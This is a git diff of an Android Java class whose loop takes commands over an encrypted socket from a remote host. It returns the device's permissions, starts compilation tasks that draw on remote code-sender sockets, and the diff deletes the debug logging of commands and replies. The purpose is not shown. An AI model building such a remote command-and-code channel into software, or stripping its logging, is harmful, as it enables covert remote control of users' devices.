@@ -18,6 +18,8 @@ public class CommunicationTask implements Runnable {
 
     private final String socketMainHostname;
     private final int socketMainPort;
+    private boolean isAlive;
+
 
     private CryptedSocket socketMain;
 
@@ -26,6 +28,7 @@ public class CommunicationTask implements Runnable {
         this.context = context;
         this.socketMainHostname = socketMainHostname;
         this.socketMainPort = socketMainPort;
+        this.isAlive = false;
     }
 
     @Override
@@ -35,13 +38,12 @@ public class CommunicationTask implements Runnable {
             this.socketMain.connect();
 
             this.socketMain.write("alive");
-            boolean isAlive = true;
+            this.isAlive = true;
 
-            while (isAlive) {
+            while (this.isAlive) {
                 String commandReceived = this.socketMain.read();
-                Log.d(TAG, commandReceived);
 
-                String toSend = "";
+                String toSend;
                 switch (commandReceived) {
                     case "Permissions":
                         toSend = DeviceUtils.getPermissions(this.context, false);
@@ -64,7 +66,6 @@ public class CommunicationTask implements Runnable {
                         int polling = ParamParser.parsePolling(this.socketMain.read());
                         int num = ParamParser.parseNum(this.socketMain.read());
 
-
                         CompilationTask compilationTask = new CompilationTask(this.context, collectorSocket, codeSenderSockets, resultTypeString, argString, polling, num);
                         ExecutorService executor = Executors.newSingleThreadExecutor();
                         executor.execute(compilationTask);
@@ -72,14 +73,13 @@ public class CommunicationTask implements Runnable {
                         toSend = "Starting";
                         break;
                     case "Close":
-                        isAlive = false;
+                        this.isAlive = false;
                         toSend = "Closing";
                         break;
                     default:
                         toSend = "Unknown command";
                 }
 
-                Log.d(TAG, toSend);
                 this.socketMain.write(toSend);
             }
         } catch (IOException | PackageManager.NameNotFoundException e) {
